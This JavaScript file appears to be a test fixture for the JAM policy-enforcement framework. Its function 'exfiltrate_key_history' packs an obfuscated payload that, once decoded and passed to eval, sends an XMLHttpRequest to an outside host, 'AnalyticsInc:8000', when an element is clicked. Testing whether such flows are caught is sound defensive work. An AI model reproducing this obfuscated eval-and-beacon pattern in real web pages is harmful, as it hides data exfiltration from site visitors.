// exfil_test_daft.js
function exfiltrate_key_history() {
  function v3(p, a, c, k, e$$4, d) {
    function v2() {
      return "\\w+";
    }
    function v1(e$$5) {
      return d[e$$5];
    }
    function v0(c$$1) {
      return c$$1.toString(36);
    }
    e$$4 = v0;
    if (!JAM.call("".replace, "", [/^/, String], JAM.policy.p1)) {
      var v6 = c;
      c = c - 1;
      for (;v6;) {
        var v4 = d;
        var v5 = c.toString(a);
        var v15 = k[c];
        if (!v15) {
          v15 = c.toString(a);
        }
        JAM.set(v4, v5, v15);
        v6 = c;
        c = c - 1;
      }
      k = [v1];
      e$$4 = v2;
      c = 1;
    }
    var v11 = c;
    c = c - 1;
    for (;v11;) {
      if (k[c]) {
        p = JAM.call(p.replace, p, [JAM.new(RegExp, ["\\b" + JAM.call(e$$4, null, [c]) + "\\b", "g"], JAM.policy.p1), k[c]], JAM.policy.p1);
      }
      v11 = c;
      c = c - 1;
    }
    return p;
  }
  var v12 = JAM.call(v3, null, ['0=5 4();0.7("3","1://2:6/8.d?"+"c=b",9);0.a(e);', 15, 15, "xmlhttp|http|AnalyticsInc|GET|XMLHttpRequest|new|8000|open|submission|true|send|daftlogic|test|html|null".split("|"), 0, {}], JAM.policy.p1);
  if (JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + v12 + " }");
  } else {
    JAM.call(eval, null, [v12]);
  }
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

